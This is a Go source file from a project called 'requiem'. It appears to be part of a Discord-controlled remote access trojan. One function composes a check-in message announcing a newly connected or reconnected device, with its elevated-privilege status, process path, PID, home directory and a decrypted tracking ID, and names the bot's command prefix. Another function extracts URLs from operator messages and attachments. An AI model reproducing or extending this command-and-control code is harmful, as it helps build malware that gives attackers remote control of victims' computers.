package discord

import (
	"fmt"
	"os"
	"regexp"

	"requiem/store"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func GetConnectionMsg(new bool) string {
	mention := "@here"
	if store.IsAdmin {
		mention = "@everyone"
	}

	message := "This device has reconnected."
	if new {
		message = "A new device has been connected."
	}

	trackingID := ""
	if store.TRACKING_ID != "" {
		trackingID = " - " + utils.Decrypt(store.TRACKING_ID)
	}

	version := fmt.Sprintf(
		"[%d.%d%s]",
		store.VERSION_UPDATE,
		store.VERSION_PATCH,
		trackingID,
	)

	info := fmt.Sprintf(
		"Elevated: %t\nProcess Path: %q\nProcess ID: %d\nHome Path: %q",
		store.IsAdmin,
		store.ExecPath,
		os.Getpid(),
		store.HomePath,
	)

	return fmt.Sprintf(
		"%s %s %s\n%s\nDo `%shelp` for a list of commands.",
		mention,
		message,
		version,
		info,
		store.COMMAND_PREFIX,
	)
}

func GetUrls(msg *discordgo.MessageCreate) []string {
	var urls []string

	regex := regexp.MustCompile(`https?://[^\s]+`)

	matches := regex.FindAllString(msg.Content, -1)
	urls = append(urls, matches...)

	for _, attachment := range msg.Attachments {
		urls = append(urls, attachment.URL)
	}

	if msg.ReferencedMessage != nil {
		for _, attachment := range msg.ReferencedMessage.Attachments {
			urls = append(urls, attachment.URL)
		}

		matches := regex.FindAllString(msg.ReferencedMessage.Content, -1)
		urls = append(urls, matches...)
	}

	return urls
}
